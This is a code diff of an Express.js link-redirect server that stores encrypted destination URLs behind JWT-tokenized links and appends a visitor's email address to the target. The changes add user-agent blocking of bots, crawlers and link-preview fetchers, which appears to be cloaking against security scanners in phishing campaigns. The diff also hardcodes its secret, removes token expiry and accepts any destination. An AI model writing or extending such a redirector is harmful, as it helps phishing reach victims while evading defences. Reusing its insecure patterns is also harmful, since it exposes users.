@@ -1,42 +1,65 @@
 const express = require('express');
-const bodyParser = require('body-parser');
-const rateLimit = require('express-rate-limit');
+const crypto = require('crypto');
 const jwt = require('jsonwebtoken');
-const { v4: uuidv4 } = require('uuid');
-const { addRedirect, getRedirect } = require('./db');
+const rateLimit = require('express-rate-limit');
+const Database = require('better-sqlite3');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Secret key for JWT token generation
-const JWT_SECRET = process.env.JWT_SECRET || 'your-very-secure-secret';
+const JWT_SECRET = 'your_strong_secret_key'; // Replace this with a secure key
+const ENCRYPTION_KEY = crypto.createHash('sha256').update(JWT_SECRET).digest();
+const IV_LENGTH = 16;
 
-// Middleware
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
+const dbPath = process.env.RENDER ? '/tmp/redirects.db' : './redirects.db';
+const db = new Database(dbPath);
 
-// Rate limit
+// Create redirects table if not exists
+db.prepare(`
+  CREATE TABLE IF NOT EXISTS redirects (
+    key TEXT PRIMARY KEY,
+    token TEXT NOT NULL,
+    destination TEXT NOT NULL
+  )
+`).run();
+
+app.use(express.static('public'));
+app.use(express.json());
+
+// Rate limiter middleware
 const limiter = rateLimit({
   windowMs: 60 * 1000,
-  max: 30,
+  max: 10,
+  message: 'Too many requests. Please try again later.',
 });
 app.use(limiter);
 
-// Serve homepage
-app.get('/', (req, res) => {
-  res.send('Redirect service running.');
-});
+function encrypt(text) {
+  const iv = crypto.randomBytes(IV_LENGTH);
+  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+  let encrypted = cipher.update(text, 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  return `${iv.toString('hex')}:${encrypted}`;
+}
 
-// Generate token
-function generateToken(key) {
-  return jwt.sign({ key }, JWT_SECRET, { expiresIn: '1d' });
+function decrypt(encryptedText) {
+  const [ivHex, encryptedData] = encryptedText.split(':');
+  const iv = Buffer.from(ivHex, 'hex');
+  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+  return decrypted;
 }
 
 function generateUniqueKey() {
-  return uuidv4().split('-')[0];
+  return crypto.randomBytes(8).toString('hex');
 }
 
-// Add redirect
+function generateToken(key) {
+  return jwt.sign({ key }, JWT_SECRET);
+}
+
+// Add a new redirect
 app.post('/add-redirect', (req, res) => {
   const { destination } = req.body;
 
@@ -47,77 +70,100 @@ app.post('/add-redirect', (req, res) => {
   const key = generateUniqueKey();
   const token = generateToken(key);
 
-  addRedirect(key, destination, token, (err) => {
-    if (err) {
-      console.error('DB insert error:', err);
-      return res.status(500).json({ message: 'Internal error storing redirect.' });
-    }
+  // Encrypt destination before storing
+  const encryptedDestination = encrypt(destination);
 
-    const baseUrl = req.protocol + '://' + req.get('host');
+  // Insert into DB
+  const stmt = db.prepare('INSERT INTO redirects (key, token, destination) VALUES (?, ?, ?)');
+  try {
+    stmt.run(key, token, encryptedDestination);
+  } catch (err) {
+    console.error('DB insert error:', err);
+    return res.status(500).json({ message: 'Internal server error.' });
+  }
 
-    res.json({
-      message: 'Redirect added successfully!',
-      redirectUrl: `${baseUrl}/${key}?token=${token}`,
-      pathRedirectUrl: `${baseUrl}/${key}/${token}`,
-    });
+  const baseUrl = req.protocol + '://' + req.get('host');
+
+  res.json({
+    message: 'Redirect added successfully!',
+    redirectUrl: `${baseUrl}/${key}?token=${token}`,
+    pathRedirectUrl: `${baseUrl}/${key}/${token}`,
   });
 });
 
-// Redirect handler (query token)
-app.get('/:key', (req, res) => {
-  const { key } = req.params;
-  const { token, email } = req.query;
+// Handle redirect with token and optional email
+app.get('/:key/:token/:email?', (req, res) => {
+  const { key, token, email: emailFromPath } = req.params;
+  const emailFromQuery = req.query.email;
+  let email = emailFromPath || emailFromQuery;
 
-  if (!token) return res.status(400).send('Token required.');
+  if (email) {
+    try {
+      email = decodeURIComponent(email);
+    } catch {
+      return res.status(400).send('Invalid email encoding.');
+    }
+  }
+
+  const userAgent = req.headers['user-agent'] || '';
+  if (/bot|crawl|spider|preview/i.test(userAgent)) {
+    return res.status(403).send('Access denied.');
+  }
+
+  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    return res.status(400).send('Invalid email format.');
+  }
 
   try {
-    jwt.verify(token, JWT_SECRET);
+    const decoded = jwt.verify(token, JWT_SECRET);
+    if (decoded.key !== key) throw new Error('Invalid token');
 
-    getRedirect(key, (err, redirectData) => {
-      if (err || !redirectData) return res.status(404).send('Redirect not found.');
-      if (redirectData.token !== token) return res.status(403).send('Invalid token.');
+    // Fetch from DB
+    const row = db.prepare('SELECT destination FROM redirects WHERE key = ?').get(key);
+    if (!row) return res.status(404).send('Redirect not found.');
 
-      let destination = redirectData.destination;
-      if (email) {
-        destination = destination.endsWith('/')
-          ? destination + email
-          : destination + '/' + email;
-      }
+    const destination = decrypt(row.destination);
 
-      return res.redirect(destination);
-    });
+    let finalUrl = destination;
+    if (email) {
+      finalUrl += destination.endsWith('/') ? email : `/${email}`;
+    }
+
+    res.redirect(finalUrl);
   } catch (err) {
-    return res.status(403).send('Invalid or expired token.');
+    console.error('Redirect error:', err);
+    res.status(403).send('Invalid or expired token.');
   }
 });
 
-// Redirect handler (path token)
+// Handle redirect with token only (no email)
 app.get('/:key/:token', (req, res) => {
   const { key, token } = req.params;
-  const { email } = req.query;
+
+  const userAgent = req.headers['user-agent'] || '';
+  if (/bot|crawl|spider|preview/i.test(userAgent)) {
+    return res.status(403).send('Access denied.');
+  }
 
   try {
-    jwt.verify(token, JWT_SECRET);
+    const decoded = jwt.verify(token, JWT_SECRET);
+    if (decoded.key !== key) throw new Error('Invalid token');
 
-    getRedirect(key, (err, redirectData) => {
-      if (err || !redirectData) return res.status(404).send('Redirect not found.');
-      if (redirectData.token !== token) return res.status(403).send('Invalid token.');
+    const row = db.prepare('SELECT destination FROM redirects WHERE key = ?').get(key);
+    if (!row) return res.status(404).send('Redirect not found.');
 
-      let destination = redirectData.destination;
-      if (email) {
-        destination = destination.endsWith('/')
-          ? destination + email
-          : destination + '/' + email;
-      }
-
-      return res.redirect(destination);
-    });
-  } catch (err) {
-    return res.status(403).send('Invalid or expired token.');
+    const destination = decrypt(row.destination);
+    res.redirect(destination);
+  } catch {
+    res.status(403).send('Invalid or expired token.');
   }
 });
 
-// Start server
+// Catch all for invalid routes
+app.use((req, res) => {
+  res.status(404).send('Error: Invalid request.');
+});
+
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running at http://localhost:${PORT}`);
 });
